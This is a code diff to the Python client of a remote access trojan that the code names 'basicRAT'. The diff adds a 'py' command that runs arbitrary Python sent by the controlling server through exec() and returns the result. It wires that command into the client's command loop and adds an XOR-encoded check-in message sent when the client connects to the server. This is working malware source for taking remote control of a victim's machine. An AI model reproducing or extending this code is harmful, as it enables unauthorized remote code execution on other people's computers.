@@ -17,6 +17,8 @@ import uuid
 import datetime
 import subprocess
 import zipfile
+import json
+import traceback
 
 # determine system platform
 if sys.platform.startswith('win'):
@@ -311,11 +313,18 @@ def wget(url):
 
     return 'File {} downloaded.'.format(fname)
 
-
-
-
-
-
+def py(code):
+    try:
+        r = None
+        exec(code)
+        if type(r) == str:
+            return r
+        else:
+            return json.dumps(r)
+    except Exception, e:
+        r = "return value is not a string or json.\n"
+        r += traceback.format_exc()
+        return r
 
 # seconds to wait before client will attempt to reconnect
 CONN_TIMEOUT = 5
@@ -371,6 +380,8 @@ def client_loop(conn):
 
         elif cmd == 'wget':
             results = wget(action)
+        elif cmd == 'py':
+            results = py(action)
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
@@ -390,6 +401,7 @@ def main():
         try:
             # attempt to connect to basicRAT server
             conn.connect((HOST, PORT))
+            conn.send(xor("new"))
         except socket.error:
             time.sleep(CONN_TIMEOUT)
             continue
